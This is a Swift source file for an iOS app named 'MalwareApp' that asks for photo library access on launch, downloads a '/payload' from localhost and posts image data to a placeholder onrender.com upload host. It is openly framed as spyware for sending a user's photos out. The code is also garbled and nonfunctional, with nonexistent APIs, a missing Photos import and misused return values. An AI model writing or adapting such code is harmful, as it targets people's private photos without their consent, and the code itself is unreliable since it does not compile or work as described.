import UIKit

class MalwareApp: UIApplicationMain {
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Request photo library access
        let photoLibraryAccessRequest = PHRequestAuthorizationOptions.usePhotoLibrary
        PHPhotoLibrary.requestAuthorization(options: photoLibraryAccessRequest)

        // Download images from /payload endpoint
        downloadImages()

        // Upload images to /data endpoint
        uploadImages()

        return true
    }

    func downloadImages() {
        // Use URLSession to download images from /payload endpoint
        let task = URLSession.shared.dataTask(with: URL(string: "https://localhost:8080/payload")!) { data, response, error in
            if let error = error {
                print("Error downloading images: \(error)")
                return
            }

            if let data = data {
                // Save the downloaded images to the device
                let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first!
                let fileName = "downloaded_image.jpg" // Replace with the appropriate file name extension
                let fullPath = "\(imagePath)/\(fileName)"

                // Save the downloaded image to the device
                let error = FileManager.default.createFile(atPath: fullPath, contents: data, attributes: nil)
                if error != nil {
                    print("Error saving downloaded image: \(error!.localizedDescription)")
                    return
                }

                // Optionally, you can display a message to the user that the image has been saved successfully.
                // ...

                // Proceed with the next steps, such as uploading the saved image to the server.
                // ...
            }
        }
        task.resume()
    }

    func uploadImages() {
        // Use URLSession to upload images to /data endpoint
        let task = URLSession.shared.dataTask(with: URL(string: "https://localhost:8080/data")!) { data, response, error in
            if let error = error {
                print("Error uploading images: \(error)")
                return
            }

            if let data = data {
                // Send the uploaded images to the server
                let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first!
                let uploadedImageFile = "uploaded_image.jpg" // Replace with the appropriate file name extension
                let uploadPath = "\(imagePath)/\(uploadedImageFile)"

                // Upload the image to the server
                let serverURL = URL(string: "https://YOUR-RENDER-URL.onrender.com/uploads")!

                var request = URLRequest(url: serverURL)
                request.httpMethod = "POST"

                let boundary = UUID().uuidString

                request.setValue(
                    "multipart/form-data; boundary=\(boundary)",
                    forHTTPHeaderField: "Content-Type"
                )

                var body = Data()
                body.append("--\(boundary)\r\n".data(using: .utf8)!)
                body.append("Content-Disposition: form-data; name=\"image\"; filename=\"\(uploadedImageFile)\"\r\n".data(using: .utf8)!)
                body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
                body.append(data)
                body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

                let uploadTask = URLSession.shared.uploadTask(with: request, from: body) { responseData, response, error in
                    if let error = error {
                        print("Image upload failed: \(error.localizedDescription)")
                        return
                    }

                    if let httpResponse = response as? HTTPURLResponse {
                        print("Server response: \(httpResponse.statusCode)")
                    }
                }

                uploadTask.resume()
            }
        }
        task.resume()
    }
}